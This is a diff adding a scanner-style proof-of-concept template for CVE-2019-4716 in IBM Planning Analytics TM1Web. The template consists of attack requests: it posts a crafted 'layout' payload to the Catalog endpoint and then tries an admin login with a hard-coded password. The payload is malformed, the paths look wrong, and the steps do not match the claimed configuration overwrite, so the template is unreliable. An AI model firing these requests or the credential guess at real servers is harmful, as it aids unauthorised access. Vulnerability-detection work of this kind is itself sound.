@@ -1,0 +1,88 @@
+[info]
+author = "ave"
+description = "检测 IBM Planning Analytics 2.0.0-2.0.8 版本是否存在配置覆盖漏洞，通过特制请求向 TM1Web 端点发送恶意配置，触发认证绕过和代码执行风险。"
+id = "POC-AVE-2019-1300"
+name = "CVE-2019-4716 IBM Planning Analytics 配置覆盖漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-1300"]
+vuln_id = [
+    "CVE-2019-4716",
+    "AVE-2019-1300",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/TM1Web"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "IBM Planning Analytics",
+    "IBM Cognos TM1",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/TM1Web/Catalog"
+protocol = "http"
+
+[poc.requests.body]
+content = '''
+layout
+=[{"children":[{"attributes":{\"name\":\""; "level":0; "datatype\":\"string\"}]
+}]'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "layout",
+    "children",
+    "attributes",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/TM1Web/login.html"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "login",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/TM1Web/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=owa"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "welcome",
+    "dashboard",
+    "tm1",
+]
